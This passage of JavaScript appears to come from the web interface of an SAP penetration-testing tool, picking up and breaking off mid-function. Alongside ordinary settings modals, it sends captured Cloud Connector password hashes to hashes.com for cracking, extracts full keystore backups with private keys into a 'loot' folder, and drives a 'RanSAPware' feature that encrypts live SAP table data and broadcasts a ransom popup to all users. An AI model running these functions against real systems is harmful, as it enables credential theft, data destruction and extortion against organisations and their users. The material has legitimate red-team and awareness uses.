    const formRow = document.getElementById('sdk-path-form-row');
    const saveBtn = document.getElementById('sdk-path-save-btn');
    const cancelBtn = document.getElementById('sdk-path-cancel-btn');
    if (inContainer) {
      if (help)    help.style.display    = 'none';
      if (formRow) formRow.style.display = 'none';
      if (saveBtn) saveBtn.style.display = 'none';
      if (cancelBtn) cancelBtn.textContent = 'Close';
      if (notice) notice.style.display = 'block';
      const host   = s.host_sdk_path || '(unknown — SAPMAP_HOST_SDK_PATH not passed)';
      const active = s.nwrfcsdk_path_active || '(none — RFC ops will fall back)';
      if (nBody) nBody.innerHTML =
          'The container entrypoint set the SDK path via <code>--sdk</code> on '
        + 'every startup, so there is nothing to edit here.'
        + '<div style="margin-top:10px">'
        +   '<div><span style="color:#8b949e">Active in container:</span> <code>' + escHtml(active) + '</code></div>'
        +   '<div style="margin-top:4px"><span style="color:#8b949e">Bind-mounted from host:</span> <code>' + escHtml(host) + '</code></div>'
        + '</div>'
        + '<div style="margin-top:10px;color:#8b949e;font-size:11px">'
        +   'To change the SDK path, restart the container with a different '
        +   '<code>SDK_PATH</code> env var: '
        +   '<code>SDK_PATH=/path/to/other/nwrfcsdk ./scripts/run-container.sh</code>.'
        + '</div>';
    } else {
      if (help)    help.style.display    = '';
      if (formRow) formRow.style.display = '';
      if (saveBtn) saveBtn.style.display = '';
      if (cancelBtn) cancelBtn.textContent = 'Cancel';
      if (notice) notice.style.display = 'none';
    }
    const input = document.getElementById('sdk-path-input');
    const info  = document.getElementById('sdk-path-current');
    // Prefer persisted value; if nothing persisted but --sdk supplied
    // an active path (typical in the Docker container), pre-populate
    // it so a Save with no edits promotes it into settings.local.json.
    if (input) input.value = s.nwrfcsdk_path || s.nwrfcsdk_path_active || '';
    if (info) {
      const persisted = s.nwrfcsdk_path || '';
      const active    = s.nwrfcsdk_path_active || '';
      // Docker-container awareness: the active path is the IN-CONTAINER
      // mount target (e.g. /opt/nwrfcsdk/lib), not the host filesystem
      // path the operator remembers.  When the wrapper passed
      // SAPMAP_HOST_SDK_PATH, tack it on so the operator can trace
      // /opt/nwrfcsdk/lib back to ~/Downloads/nwrfcsdk on their laptop.
      const inContainer = !!s.in_container;
      const hostPath = s.host_sdk_path || '';
      const containerHint = inContainer
        ? (hostPath
            ? ' · Container mount ← host: ' + hostPath
            : ' · (in-container mount target; host origin unknown)')
        : '';
      if (active && persisted && active === persisted) {
        info.textContent = 'Active (from settings.local.json): ' + active + containerHint;
      } else if (active && !persisted) {
        info.textContent = 'Active (from --sdk on the CLI): ' + active
          + containerHint
          + (inContainer
              ? ' — this is the container path; leave it as-is and Save to persist.'
              : ' — save here to persist and survive restarts.');
      } else if (active && persisted && active !== persisted) {
        info.textContent = 'Active (from --sdk): ' + active
          + containerHint
          + ' · Persisted: ' + persisted
          + ' — Save will overwrite the persisted value; the active '
          + '--sdk value keeps priority until the next restart.';
      } else if (persisted && !active) {
        info.textContent = 'Persisted: ' + persisted
          + ' — but not currently loaded (RFC SDK could not be located).';
      } else {
        info.textContent = 'Not set — RFC ops fall back to system '
          + 'LD_LIBRARY_PATH / DYLD_LIBRARY_PATH / PATH.';
      }
    }
  } catch(e) {}
  document.getElementById('sdk-path-modal').classList.add('visible');
}

async function saveSdkPath() {
  // Empty string is a valid save — clears the setting.  We do NOT
  // require the operator to confirm; if they hit Save with a blank
  // field they explicitly asked to unset it.
  const val = (document.getElementById('sdk-path-input').value || '').trim();
  const r = await fetch('/api/settings/local', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({nwrfcsdk_path: val})
  });
  const d = await r.json();
  if (d.ok) {
    const msg = val
      ? ('NW RFC SDK path saved: ' + val
          + (d.warning ? '  — ' + d.warning : ''))
      : 'NW RFC SDK path cleared (falls back to system libs).';
    showToast(msg, d.warning ? 'warn' : 'success');
    closeModal('sdk-path-modal');
  } else {
    showToast('Failed to save: ' + (d.error || '?'), 'error');
  }
}

async function showSapologyPathModal() {
  // Populates the current value + status line for the SAPology path.
  // Mirrors showSdkPathModal but keeps the flow simple — SAPology is
  // a plain directory checkout, no Docker container swap and no
  // multi-source ambiguity beyond the persisted-vs-active display.
  try {
    const s = await fetch('/api/settings/local').then(r => r.json());
    const input = document.getElementById('sapology-path-input');
    const info  = document.getElementById('sapology-path-current');
    if (input) input.value = s.sapology_path || s.sapology_path_active || '';
    if (info) {
      const persisted = s.sapology_path || '';
      const active    = s.sapology_path_active || '';
      if (active && persisted && active === persisted) {
        info.textContent = 'Active (from settings.local.json): ' + active;
      } else if (active && !persisted) {
        info.textContent = 'Active (default sibling or --sapology / '
          + '$SAPMAP_SAPOLOGY_PATH): ' + active
          + ' — save here to persist a custom path in settings.local.json.';
      } else if (active && persisted && active !== persisted) {
        info.textContent = 'Active: ' + active
          + ' · Persisted: ' + persisted
          + ' — CLI / env override wins until the next restart.';
      } else if (persisted && !active) {
        info.textContent = 'Persisted: ' + persisted
          + ' — but the directory could not be located.';
      } else {
        info.textContent = 'Not set — Deep Scan will silently fall back '
          + 'to Fast Scan with enrichment.';
      }
    }
  } catch(e) {}
  document.getElementById('sapology-path-modal').classList.add('visible');
}

async function saveSapologyPath() {
  const val = (document.getElementById('sapology-path-input').value || '').trim();
  const r = await fetch('/api/settings/local', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({sapology_path: val})
  });
  const d = await r.json();
  if (d.ok) {
    const msg = val
      ? ('SAPology path saved: ' + val
          + (d.warning ? '  — ' + d.warning : ''))
      : 'SAPology path cleared (reverted to default sibling directory).';
    showToast(msg, d.warning ? 'warn' : 'success');
    closeModal('sapology-path-modal');
  } else {
    showToast('Failed to save: ' + (d.error || '?'), 'error');
  }
}

async function sccLookupHashesOnline() {
  const modal = document.getElementById('scc-hashes-modal');
  const host = modal.dataset.host;
  if (!host) { showToast('No SCC host in modal', 'error'); return; }

  // Check if API key is set
  const settingsR = await fetch('/api/settings/local');
  const settings = await settingsR.json();
  if (!settings.hashes_com_api_key_set) {
    document.getElementById('hashes-api-key-input').value = '';
    document.getElementById('hashes-api-modal').classList.add('visible');
    return;
  }

  // Build hash list from stored modal data
  const users = modal._users || [];
  const hashes = users.filter(u => u.hash_hex).map(u => ({
    username: u.username,
    hash_hex: u.hash_hex,
    algorithm: u.algorithm,
    hashcat_line: u.hashcat_line,
  }));
  if (!hashes.length) { showToast('No hex hashes to look up', 'warn'); return; }

  const btn = document.getElementById('hashes-lookup-btn');
  if (btn) btn.textContent = '\u23f3 Looking up\u2026';
  const resDiv = document.getElementById('scc-hashes-online-results');
  if (resDiv) resDiv.innerHTML = '';

  let r;
  try {
    r = await fetch(`/api/scc/${encodeURIComponent(host)}/lookup_hashes_online`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({hashes})
    });
    r = await r.json();
  } catch(e) {
    showToast('Request failed: ' + e, 'error');
    if (btn) btn.textContent = '\ud83d\udd0d Lookup on hashes.com';
    return;
  }
  if (btn) btn.textContent = '\ud83d\udd0d Lookup on hashes.com';

  if (!r.ok) {
    showToast('hashes.com: ' + (r.error||'error'), 'error');
    return;
  }

  // Show results
  let html = `<div style="margin-top:8px;padding:8px;background:#161b22;border-radius:4px;font-size:12px">` +
    `<div style="color:#8b949e;margin-bottom:6px">hashes.com results \u2014 ` +
    `${r.cracked}/${r.results.length} cracked, cost: ${r.cost} credit(s)</div>`;
  for (const res of (r.results || [])) {
    if (res.found) {
      html += `<div style="color:#3fb950;font-family:monospace">\u2713 ${escHtml(res.username)}: <b>${escHtml(res.plaintext)}</b> \u2014 stored as SCC credential</div>`;
    } else {
      html += `<div style="color:#484f58;font-family:monospace">\u2717 ${escHtml(res.username)}: not found</div>`;
    }
  }
  html += '</div>';
  if (resDiv) resDiv.innerHTML = html;

  if (r.cracked > 0) {
    console.log(`[+] ${r.cracked} SCC password(s) cracked — stored as credentials`);
    refreshState();
  }
}

async function sccExtractKeystore(host) {
  if (!confirm('EXTRACT FULL SCC KEYSTORE BACKUP from ' + host + '?\n\n' +
               'This calls POST /api/v1/configuration/backup which returns a zip ' +
               'containing every tunnel client cert + private key, the system ' +
               'identity keystore, the SSFS blob (PP CA private key), and the ' +
               'local users.xml.\n\n' +
               'SAPMAP will then auto-decrypt the SSFS in pure Python (no JDK / ' +
               'no SAP libs needed) and unlock every .p12 keystore in the zip. ' +
               'Plaintext secrets land in a side-file at mode 0600; only key ' +
               'NAMES enter findings.\n\n' +
               'The zip will be saved under ./loot/scc/' + host + '/ with mode 0600. ' +
               'Treat as crown-jewels material.')) return;
  const stored = _sccStoredCreds(host);
  const defUser = (stored && stored.username) ? stored.username : 'Administrator';
  const defPass = (stored && stored.password) ? stored.password : '';
  const u = prompt('SCC admin username for ' + host + ':', defUser);
  if (!u) return;
  const p = prompt('Password for ' + u + ':', defPass);
  if (p === null) return;
  const bp = prompt('Backup encryption password (passphrase that locks keystores in the zip):', p || defPass);
  if (!bp) return;
  try {
    flashActivity('SCC ' + host + ': extracting keystore', 30000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/extract_keystore',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ username: u, password: p, backup_password: bp }) });
    const d = await r.json();
    if (d.error) alert('Extraction failed: ' + d.error);
  } catch (e) { alert('Extraction error: ' + e); }
}

async function sccProbeMappings(host) {
  const sn = (mapState.scc_nodes || {})[host];
  const n = (sn && sn.mappings) ? sn.mappings.length : 0;
  if (n === 0) { alert('No mappings on ' + host + ' — pull them first.'); return; }
  if (!confirm('Tunnel-relay smoke test on ' + n + ' mapping(s)?\n\n' +
               'TCP/HTTP HEAD probe of each mapping\'s internal endpoint. ' +
               'No credentials are sent. ~4s timeout per mapping.')) return;
  try {
    flashActivity('SCC ' + host + ': probing mappings', 8000 + n * 4000);
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/probe_mappings',
                          { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
    const d = await r.json();
    if (d.error) alert('Probe failed: ' + d.error);
  } catch (e) { alert('Probe error: ' + e); }
}

function showImpactDetail(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  const results = (n.impact_results || []).slice().sort((a,b) => (b.severity||0) - (a.severity||0));
  const sevColors = { 5:'#e74c3c', 4:'#e67e22', 3:'#f1c40f', 2:'#3498db', 1:'#95a5a6' };
  const sevLabels = { 5:'CRITICAL', 4:'HIGH', 3:'MEDIUM', 2:'LOW', 1:'INFO' };

  const withData = results.filter(r => r.record_count > 0);
  const empty = results.filter(r => r.record_count === 0 && !r.error);

  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>&#128200; ${escHtml(n.sid)} — Business Impact (${withData.length} findings)</h3>
    ${withData.length === 0 ? '<div style="color:#8b949e;padding:8px">No impact data yet. Right-click → Business Impact → Run ABAP/Java Impact Scenarios.</div>' : ''}
    ${withData.map(r => {
      const col = sevColors[r.severity] || '#95a5a6';
      const lbl = sevLabels[r.severity] || 'INFO';
      const icon = r.icon || '';
      const samples = r.sample_records || [];
      const previewRows = samples.slice(0, 5);
      // Two row shapes:
      //   - dicts (ABAP impact scenarios)            -> column per dict key
      //   - plain strings (Java impact scenarios)    -> single "Evidence" col
      const isStringRows = previewRows.length > 0 && typeof previewRows[0] === 'string';
      const cols = isStringRows
          ? ['Evidence']
          : (previewRows.length > 0
              ? Object.keys(previewRows[0]).filter(k => !Array.isArray(previewRows[0][k]) && typeof previewRows[0][k] !== 'object')
              : []);

      return '<div class="detail-section" style="border-left:3px solid ' + col + ';padding-left:10px;margin-bottom:12px">' +
        '<div style="display:flex;justify-content:space-between;align-items:center">' +
          '<h4 style="margin:0;font-size:13px">' + icon + ' ' + escHtml(r.headline) + '</h4>' +
          '<span style="font-size:10px;padding:2px 6px;border-radius:3px;background:' + col + ';color:#fff;font-weight:bold">' + lbl + '</span>' +
        '</div>' +
        '<div style="font-size:11px;color:#8b949e;margin:4px 0">' + escHtml(r.category) + ' &mdash; ' + r.record_count + ' records</div>' +
        '<div style="font-size:12px;color:#c9d1d9;margin:6px 0;white-space:pre-wrap">' + escHtml(r.business_message) + '</div>' +
        (previewRows.length > 0 ? '<details style="margin-top:6px"><summary style="cursor:pointer;font-size:11px;color:#58a6ff">Preview data (' + previewRows.length + ' of ' + samples.length + ' records)</summary>' +
          '<div style="overflow-x:auto;margin-top:4px"><table style="width:100%;font-size:10px;border-collapse:collapse">' +
          '<tr>' + cols.map(c => '<th style="text-align:left;padding:2px 6px;border-bottom:1px solid #30363d;color:#8b949e">' + escHtml(c) + '</th>').join('') + '</tr>' +
          previewRows.map(row => {
            if (isStringRows) {
              return '<tr><td style="padding:2px 6px;border-bottom:1px solid #21262d;font-family:monospace;color:#c9d1d9;word-break:break-all">' + escHtml(String(row)) + '</td></tr>';
            }
            return '<tr>' + cols.map(c => '<td style="padding:2px 6px;border-bottom:1px solid #21262d;font-family:monospace;color:#c9d1d9">' + escHtml(String(row[c]||'')) + '</td>').join('') + '</tr>';
          }).join('') +
          '</table></div>' +
          '<a href="#" class="csv-export-link" data-sid="' + escHtml(n.sid) + '" data-scenario="' + escHtml(r.scenario) + '" ' +
            'style="font-size:11px;color:#58a6ff;text-decoration:none;display:inline-block;margin-top:4px">&#128229; Export CSV</a>' +
          '</details>' : '') +
        '</div>';
    }).join('')}
    ${empty.length > 0 ? '<div class="detail-section" style="margin-top:8px"><h4 style="color:#484f58;font-size:12px">Not found (' + empty.length + ')</h4>' +
      empty.map(r => '<div style="font-size:11px;color:#484f58;margin:2px 0">' + (r.icon||'') + ' ' + escHtml(r.scenario.replace(/_/g,' ')) + '</div>').join('') +
      '</div>' : ''}
  `;

  // Wire up CSV export links
  panel.querySelectorAll('.csv-export-link').forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      downloadCsv(link.getAttribute('data-sid'), link.getAttribute('data-scenario'));
    });
  });

  panel.classList.add('visible');
}

// ---------------------------------------------------------------------------
// RanSAPware Awareness PoC — Encrypt / Decrypt modals
// ---------------------------------------------------------------------------

async function showRansapwareModal(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  if (!n.pwned && !(n.credentials || []).length && !(n.created_users || []).length) {
    showToast('No credentials for ' + sid + ' — pwn the system first', 'error');
    return;
  }
  const panel = document.getElementById('detail-panel');
  panel.dataset.sid = sid;
  panel.setAttribute('data-view', 'ransapware');

  // Fetch suggested tables
  let suggested = [];
  try {
    const r = await api('GET', 'ransapware/suggested_tables');
    if (Array.isArray(r)) suggested = r;
  } catch (_) {}

  const sugRows = suggested.map(s =>
    `<tr class="rw-sug-row" data-table="${escHtml(s.table)}" style="cursor:pointer"
         onclick="document.getElementById('rw-table-input').value='${escHtml(s.table)}';rwFetchFields('${escHtml(sid)}')">
       <td style="padding:3px 8px;font-family:monospace;font-weight:bold;color:#58a6ff">${escHtml(s.table)}</td>
       <td style="padding:3px 8px;color:#8b949e">${escHtml(s.category)}</td>
       <td style="padding:3px 8px;color:#8b949e;font-size:11px">${escHtml(s.desc)}</td>
     </tr>`
  ).join('');

  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3 style="color:#f85149">&#128274; RanSAPware Awareness PoC — ${escHtml(sid)}</h3>
    <div style="background:#2d1215;border:1px solid #f85149;border-radius:6px;padding:10px 14px;margin-bottom:12px">
      <div style="font-weight:bold;color:#f85149;margin-bottom:4px">&#9888; DESTRUCTIVE OPERATION</div>
      <div style="font-size:12px;color:#e6edf3">This will <strong>encrypt</strong> real table data on <strong>${escHtml(sid)}</strong>.
      Fields will be overwritten with scrambled values.  The data can be restored using the
      Decrypt function — which requires the manifest file saved to your loot directory.
      <br><br>A <strong>TH_POPUP</strong> ransom note will be broadcast to all logged-in SAP users.</div>
    </div>
    <div class="detail-section">
      <h4>Step 1: Select Table</h4>
      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
        <input id="rw-table-input" type="text" placeholder="Table name (e.g. KNA1)"
               style="flex:1;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:13px"
               onkeydown="if(event.key==='Enter')rwFetchFields('${escHtml(sid)}')">
        <button class="btn btn-primary" style="padding:6px 14px;font-size:12px"
                onclick="rwFetchFields('${escHtml(sid)}')">Fetch Fields</button>
      </div>
      ${suggested.length ? `
      <div style="font-size:11px;color:#8b949e;margin-bottom:4px">Suggested tables (click to select):</div>
      <div style="max-height:180px;overflow-y:auto;border:1px solid #21262d;border-radius:4px">
        <table style="width:100%;border-collapse:collapse;font-size:12px">
          <tbody>${sugRows}</tbody>
        </table>
      </div>` : ''}
    </div>
    <div id="rw-fields-section" style="display:none">
      <div class="detail-section">
        <h4>Step 2: Select Fields to Encrypt</h4>
        <div style="font-size:11px;color:#8b949e;margin-bottom:6px">
          Only CHAR(15+) / STRING / LCHR fields shown.  Key fields are excluded.
        </div>
        <div id="rw-fields-list"></div>
      </div>
      <div class="detail-section">
        <h4>Step 3: Options</h4>
        <div style="display:flex;flex-direction:column;gap:6px">
          <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:#e6edf3">
            <span>Max rows:</span>
            <input id="rw-max-rows" type="number" value="5000" min="1" max="999999"
                   style="width:80px;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 8px;border-radius:4px;font-family:monospace">
          </label>
          <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:#e6edf3">
            <input id="rw-popup" type="checkbox" checked style="accent-color:#f85149">
            Send TH_POPUP ransom note to all users
          </label>
        </div>
      </div>
      <div style="margin-top:12px;text-align:center">
        <button id="rw-encrypt-btn" class="btn" style="background:#da3633;border:1px solid #f85149;color:#fff;padding:10px 28px;font-size:14px;font-weight:bold;border-radius:6px;cursor:pointer"
                onclick="rwEncrypt('${escHtml(sid)}')">
          &#128274; ENCRYPT TABLE DATA
        </button>
      </div>
    </div>
  `;
  panel.classList.add('visible');
}

async function rwFetchFields(sid) {
  const table = (document.getElementById('rw-table-input').value || '').trim().toUpperCase();
  if (!table) { showToast('Enter a table name', 'error'); return; }
  const fSection = document.getElementById('rw-fields-section');
  const fList = document.getElementById('rw-fields-list');
  const encBtn = document.getElementById('rw-encrypt-btn');
  fList.innerHTML = '<div style="color:#8b949e;padding:8px">Fetching metadata...</div>';
  fSection.style.display = 'block';
  if (encBtn) { encBtn.disabled = true; encBtn.style.opacity = '0.5'; }
  try {
    // Check for active encryption on this table
    let manifests = [];
    try {
      manifests = await api('GET', 'node/' + sid + '/ransapware/manifests');
      if (!Array.isArray(manifests)) manifests = [];
    } catch (_) {}
    const activeOnTable = manifests.filter(m =>
      m.table === table && !m.decrypted && m.rows_encrypted > 0);
    if (activeOnTable.length) {
      fList.innerHTML = '<div style="color:#f85149;padding:8px">'
        + '&#9888; Table ' + escHtml(table) + ' already has an active encryption ('
        + activeOnTable[0].rows_encrypted + ' rows). Decrypt it first before re-encrypting.</div>';
      if (encBtn) { encBtn.disabled = true; encBtn.style.opacity = '0.5'; }
      return;
    }
    const r = await api('POST', 'node/' + sid + '/ransapware/fields', {table});
    if (r.error) { fList.innerHTML = '<div style="color:#f85149">' + escHtml(r.error) + '</div>'; return; }
    const eligible = (r.fields || []).filter(f => f.eligible);
    const keyFields = (r.fields || []).filter(f => f.is_key).map(f => f.name);
    if (!eligible.length) {
      fList.innerHTML = '<div style="color:#d29922">No eligible fields (CHAR15+ / STRING) found in ' + escHtml(table) + '</div>';
      return;
    }
    fList.dataset.keyFields = JSON.stringify(keyFields);
    fList.dataset.table = table;
    fList.innerHTML = '<table style="width:100%;border-collapse:collapse;font-size:12px">'
      + '<thead><tr style="color:#8b949e;border-bottom:1px solid #30363d">'
      + '<th style="text-align:left;padding:3px 6px;width:30px"></th>'
      + '<th style="text-align:left;padding:3px 6px">Field</th>'
      + '<th style="text-align:left;padding:3px 6px">Type</th>'
      + '<th style="text-align:left;padding:3px 6px">Len</th>'
      + '<th style="text-align:left;padding:3px 6px">Description</th>'
      + '</tr></thead><tbody>'
      + eligible.map(f =>
        '<tr><td style="padding:3px 6px"><input type="checkbox" class="rw-field-cb" value="' + escHtml(f.name) + '" checked style="accent-color:#f85149"></td>'
        + '<td style="padding:3px 6px;font-family:monospace;font-weight:bold">' + escHtml(f.name) + '</td>'
        + '<td style="padding:3px 6px;color:#8b949e">' + escHtml(f.datatype) + '</td>'
        + '<td style="padding:3px 6px;color:#8b949e">' + f.length + '</td>'
        + '<td style="padding:3px 6px;color:#8b949e;font-size:11px">' + escHtml(f.description) + '</td></tr>'
      ).join('')
      + '</tbody></table>';
    if (encBtn) { encBtn.disabled = false; encBtn.style.opacity = '1'; }
  } catch (e) {
    fList.innerHTML = '<div style="color:#f85149">Error: ' + escHtml(String(e)) + '</div>';
  }
}

async function rwEncrypt(sid) {
  const fList = document.getElementById('rw-fields-list');
  const table = (fList.dataset.table || '').trim();
  const keyFields = JSON.parse(fList.dataset.keyFields || '[]');
  const checked = [...document.querySelectorAll('.rw-field-cb:checked')].map(cb => cb.value);
  if (!checked.length) { showToast('Select at least one field', 'error'); return; }
  const maxRows = parseInt(document.getElementById('rw-max-rows').value, 10) || 5000;
  const sendPopup = document.getElementById('rw-popup').checked;

  if (!confirm(
    'RANSAPWARE AWARENESS PoC\n\n'
    + 'This will ENCRYPT ' + checked.length + ' field(s) in table ' + table
    + ' on ' + sid + ' (up to ' + maxRows + ' rows).\n\n'
    + 'The data will be UNREADABLE until decrypted.\n'
    + (sendPopup ? 'A TH_POPUP ransom note will appear on ALL user screens.\n\n' : '\n')
    + 'You MUST have the manifest file (saved in loot/) to reverse this.\n\n'
    + 'Continue?'
  )) return;

  const btn = document.getElementById('rw-encrypt-btn');
  btn.disabled = true;
  btn.textContent = 'Encrypting...';

  try {
    await api('POST', 'node/' + sid + '/ransapware/encrypt', {
      table, fields: checked, key_fields: keyFields,
      max_rows: maxRows, send_popup: sendPopup,
    });
    showToast('RanSAPware encryption started — check console for progress', 'info');
    startPolling();
  } finally {
    btn.disabled = false;
    btn.innerHTML = '&#128274; ENCRYPT TABLE DATA';
  }
}

async function showRansapwareDecryptModal(sid) {
  const panel = document.getElementById('detail-panel');
  panel.dataset.sid = sid;
  panel.setAttribute('data-view', 'ransapware-decrypt');

  let manifests = [];
  try {
    manifests = await api('GET', 'node/' + sid + '/ransapware/manifests');
    if (!Array.isArray(manifests)) manifests = [];
  } catch (_) {}

  const active = manifests.filter(m => !m.decrypted);
  const restored = manifests.filter(m => m.decrypted);

  const row = (m) => {
    const statusColor = m.decrypted ? '#3fb950' : '#f85149';
    const statusLabel = m.decrypted ? 'RESTORED' : 'ENCRYPTED';
    return `<div style="border:1px solid #30363d;border-radius:6px;padding:10px 14px;margin:8px 0;background:#0d1117">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <span style="font-family:monospace;font-weight:bold;font-size:13px">${escHtml(m.table)}</span>
          <span style="color:${statusColor};font-size:11px;margin-left:8px">${statusLabel}</span>
        </div>
        <span style="color:#8b949e;font-size:11px">${escHtml(m.timestamp || '')}</span>
      </div>
      <div style="font-size:11px;color:#8b949e;margin-top:4px">
        Fields: ${escHtml((m.fields || []).join(', '))} &middot;
        Rows: ${m.rows_encrypted} &middot;
        FM: ${escHtml(m.fm_name || '?')}
        ${m.popup_sent ? ' &middot; <span style="color:#d29922">TH_POPUP sent</span>' : ''}
      </div>
      ${!m.decrypted ? `<div style="display:flex;gap:8px;margin-top:8px;align-items:center"><button class="btn" data-rw-action="decrypt" style="background:#238636;border:1px solid #2ea043;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
        onclick="rwDecrypt('${escHtml(sid)}', '${escHtml(m.path)}', false)">&#128275; Decrypt (Restore)</button>
        <button class="btn" style="background:transparent;border:1px solid #484f58;color:#8b949e;padding:4px 10px;font-size:11px;border-radius:4px;cursor:pointer"
        onclick="rwDeleteManifest('${escHtml(sid)}', '${escHtml(m.path)}')">&#128465; Delete manifest</button></div>` : ''}
      ${m.decrypted ? `<div style="display:flex;gap:8px;margin-top:8px;align-items:center"><button class="btn" data-rw-action="undo" style="background:#d29922;border:1px solid #e3b341;color:#fff;padding:4px 14px;font-size:12px;border-radius:4px;cursor:pointer"
        onclick="rwDecrypt('${escHtml(sid)}', '${escHtml(m.path)}', true)">&#9888; Undo decrypt (re-encrypt with this key)</button>
        <button class="btn" style="background:transparent;border:1px solid #484f58;color:#8b949e;padding:4px 10px;font-size:11px;border-radius:4px;cursor:pointer"
        onclick="rwDeleteManifest('${escHtml(sid)}', '${escHtml(m.path)}')">&#128465; Delete manifest</button></div>` : ''}
    </div>`;
  };

  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>&#128275; RanSAPware — Decrypt / Restore — ${escHtml(sid)}</h3>
    ${!manifests.length ? '<div style="color:#8b949e;padding:12px">No ransapware manifests found for this system.  Run Encrypt first.</div>' : ''}
    ${active.length ? '<h4 style="color:#f85149">Active (encrypted)</h4>' + active.map(row).join('') : ''}
    ${restored.length ? '<h4 style="color:#3fb950;margin-top:12px">Restored</h4>' + restored.map(row).join('') : ''}
  `;
  panel.classList.add('visible');
}

async function rwDecrypt(sid, manifestPath, reverse, evt) {
  const msg = reverse
    ? 'RECOVERY: This will RE-ENCRYPT the data using the manifest key to undo an erroneous decrypt.\n\nContinue?'
    : 'Decrypt and restore the table data?';
  if (!confirm(msg)) return;
  // Disable all decrypt/undo buttons to prevent double-click
  document.querySelectorAll('[data-rw-action]').forEach(b => {
    b.disabled = true; b.style.opacity = '0.5';
    b.textContent = reverse ? 'Re-encrypting...' : 'Decrypting...';
  });
  await api('POST', 'node/' + sid + '/ransapware/decrypt', {
    manifest_path: manifestPath, reverse: !!reverse
  });
  const label = reverse ? 'Recovery (re-encrypt)' : 'Decryption';
  showToast('RanSAPware ' + label + ' started — check console', 'info');
  startPolling();
  setTimeout(() => showRansapwareDecryptModal(sid), 3000);
}

async function rwDeleteManifest(sid, manifestPath) {
  if (!confirm('Delete this manifest?\n\nOnly do this if the encryption never actually succeeded (e.g. ABAP error). If the table IS encrypted, use Decrypt instead.')) return;
  await api('POST', 'node/' + sid + '/ransapware/manifest/delete', {manifest_path: manifestPath});
  showToast('Manifest deleted', 'info');
  showRansapwareDecryptModal(sid);
}

function showFindings(sid) {
  const n = (mapState.nodes || {})[sid];
  if (!n) return;
  const panel = document.getElementById('detail-panel');
  // Track which SID's panel is open so the scan-poll loop can
  // re-render it when new findings for that SID arrive (issue #2
  // item 3).  Any OTHER showX function that writes into #detail-panel
  // overwrites the data-view attr, so the poll loop knows to stop
  // re-rendering as Findings the moment the operator navigates away.
  _openFindingsPanelSid = sid;
  panel.setAttribute('data-view', 'findings');
  panel.setAttribute('data-sid', sid);
  const sevMap = { 5:'critical', 4:'high', 3:'medium', 2:'low', 1:'info' };
  const sevToNum = { CRITICAL: 5, HIGH: 4, MEDIUM: 3, LOW: 2, INFO: 1 };

  // 1. Persistent findings (node.findings — survive across sessions)
  const persistent = (n.findings || []).slice().map(f => ({
    name: f.name,
    severity: f.severity,
    severity_label: f.severity_label || 'INFO',
    description: f.description || '',
    detail: f.detail || '',
    remediation: f.remediation || '',
    attack_techniques: f.attack_techniques || [],
    _source: 'persistent',
  }));
  const persistentNames = new Set(persistent.map(p => p.name));

  // 2. Live bus findings for this SID — emit_finding() records that
  //    track ephemeral exploit events (vulnerable gateway, ICMAD
  //    bypass, ABAP SecStore decrypt, LPE probe results, …).  Many
  //    flip a SAPNode boolean (gw_vulnerable, …) without appending to
  //    node.findings, so they wouldn't otherwise appear here.
  const liveAll = (_activeFindings || []).filter(f => f.node === sid);
  // Dedupe: if a persistent finding's exact name appears as a live
  // message we skip the live copy (the persistent one wins because
  // it carries description + remediation).
  const live = liveAll
    .filter(f => !persistentNames.has(f.msg))
    .map(f => ({
      name: f.msg,
      severity: sevToNum[f.severity] || 1,
      severity_label: f.severity || 'INFO',
      description: f.cve ? ('CVE / ref: ' + f.cve) : '',
      detail: f.ref || '',
      remediation: '',
      attack_techniques: f.attack_techniques || [],
      _source: 'live',
      _id: f.id,
      _ts: f.ts,
    }));

  const all = persistent.concat(live)
    .sort((a, b) => (b.severity || 0) - (a.severity || 0));

  const liveCountLabel = live.length
    ? ` <span style="color:#8b949e;font-weight:normal;font-size:11px">(${persistent.length} persistent + ${live.length} live)</span>`
    : '';

  panel.innerHTML = `
    <span class="close-btn" onclick="_closeDetailPanel()">&times;</span>
    <h3>${escHtml(n.sid)} — Findings (${all.length})${liveCountLabel}</h3>
    ${all.map(f => {
      const cls = 'finding-' + (sevMap[f.severity] || 'info');
      const pills = renderAttackPills(f.attack_techniques || [], {max: 4});
      const sourceTag = f._source === 'live'
        ? ` <span style="font-size:9px;color:#8b949e;border:1px solid #30363d;border-radius:2px;padding:0 4px;vertical-align:middle" title="From the live findings bus (emit_finding) — also visible in the bell-icon log.  Click bell to dismiss.">live</span>`
        : '';
      const detailLine = f.detail
        ? `<br><span style="color:#6e7681;font-size:10px;font-family:monospace">${escHtml(f.detail)}</span>`
        : '';
      const remediationLine = renderRemediationBlock(f.remediation);
      return `<div class="finding-item ${cls}"><strong>${escHtml(f.severity_label || 'INFO')}</strong>${sourceTag} — ${escHtml(f.name)} ${pills}<br><span style="color:#8b949e;font-size:10px">${escHtml(f.description)}</span>${detailLine}${remediationLine}</div>`;
    }).join('') || '<div style="color:#484f58">No findings</div>'}
  `;
  panel.classList.add('visible');
}

// --- Credential modal ---
function showCredModal(sid) {
  const n = (mapState.nodes || {})[sid];
